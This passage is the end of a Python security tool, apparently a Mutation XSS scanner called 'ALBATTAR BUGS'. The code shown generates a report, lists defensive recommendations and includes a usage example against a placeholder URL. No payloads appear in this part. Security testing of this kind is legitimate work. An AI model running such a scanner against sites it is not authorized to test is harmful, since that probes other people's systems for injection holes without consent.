            "recommendations": self._generate_general_recommendations()
        }
        
        return report
    
    def _generate_statistics(self) -> Dict:
        """توليد إحصائيات الفحص"""
        
        stats = {
            "total_tests": len(self.mxss_payloads),
            "vulnerabilities_found": len(self.vulnerabilities),
            "vulnerability_types": {},
            "severity_distribution": {
                "CRITICAL": 0,
                "HIGH": 0,
                "MEDIUM": 0,
                "LOW": 0
            }
        }
        
        # Count by type
        for vuln in self.vulnerabilities:
            vuln_type = vuln["type"]
            stats["vulnerability_types"][vuln_type] = \
                stats["vulnerability_types"].get(vuln_type, 0) + 1
            
            # Count by severity
            severity = vuln.get("severity", "MEDIUM")
            stats["severity_distribution"][severity] += 1
        
        return stats
    
    def _generate_summary(self) -> str:
        """توليد ملخص الفحص"""
        
        if not self.vulnerabilities:
            return "No Mutation XSS vulnerabilities detected."
        
        summary = f"""
Mutation XSS Scan Summary:
--------------------------
Total Vulnerabilities Found: {len(self.vulnerabilities)}

Critical Findings:
"""
        
        for vuln in self.vulnerabilities[:5]:  # Top 5
            summary += f"\n• {vuln['type']}"
            summary += f"\n  Confidence: {vuln['confidence']}%"
            summary += f"\n  Technique: {vuln.get('technique', 'N/A')}"
            summary += "\n"
        
        return summary
    
    def _generate_general_recommendations(self) -> List[str]:
        """توليد توصيات عامة"""
        
        return [
            "1. NEVER use innerHTML with user-controllable data",
            "2. Use textContent or createTextNode for text-only content",
            "3. If HTML is required, use DOMPurify (latest version) with strict config",
            "4. Implement Content Security Policy (CSP) to limit XSS impact",
            "5. Validate and sanitize all input on the server-side",
            "6. Use modern frameworks with automatic XSS protection (React, Vue, Angular)",
            "7. Avoid legacy DOM APIs (document.write, insertAdjacentHTML without sanitization)",
            "8. Regular security testing including mXSS-specific tests",
            "9. Keep all dependencies (including DOMPurify) up to date",
            "10. Implement defense in depth - multiple layers of XSS protection"
        ]
    
    def __del__(self):
        """تنظيف الموارد"""
        try:
            if self.driver:
                self.driver.quit()
        except:
            pass


# ═══════════════════════════════════════════════════════════════
#                          USAGE EXAMPLE
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    """
    مثال على الاستخدام
    """
    
    # Configuration
    config = {
        "timeout": 30,
        "threads": 5,
        "user_agent": "AlBaTTaR-BUGS/1.0 (Mutation XSS Scanner)",
        "proxy": None,  # "http://127.0.0.1:8080"
        "verify_ssl": True
    }
    
    # Target
    target = "https://example.com/vulnerable-page"
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║       ⚔️  ALBATTAR BUGS - Mutation XSS Scanner  ⚔️          ║
║            Created by ROBIN | @ll bUg                       ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Initialize scanner
    scanner = MutationXSSScanner(target, config)
    
    # Run scan
    print(f"\n[*] Starting Mutation XSS scan on: {target}\n")
    vulnerabilities = scanner.scan()
    
    # Generate report
    report = scanner.generate_report()
    
    # Display results
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n{Colors.RED}[!] Found {len(vulnerabilities)} Mutation XSS vulnerabilities{Colors.RESET}\n")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"{i}. {vuln['type']}")
            print(f"   Confidence: {vuln['confidence']}%")
            print(f"   Payload: {vuln['payload'][:80]}...")
            print(f"   Technique: {vuln.get('technique', 'N/A')}")
            print()
    else:
        print(f"\n{Colors.GREEN}[✓] No Mutation XSS vulnerabilities found{Colors.RESET}\n")
    
    # Save report
    import json
    with open('mxss_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"{Colors.GREEN}[✓] Full report saved to: mxss_report.json{Colors.RESET}\n")
    
    print(report['summary'])
    
    print("\n" + "="*60)
    print("RECOMMENDATIONS")
    print("="*60 + "\n")
    
    for rec in report['recommendations']:
        print(f"• {rec}")
    
    print(f"\n{Colors.YELLOW}[!] Remember: Only test on authorized targets!{Colors.RESET}\n")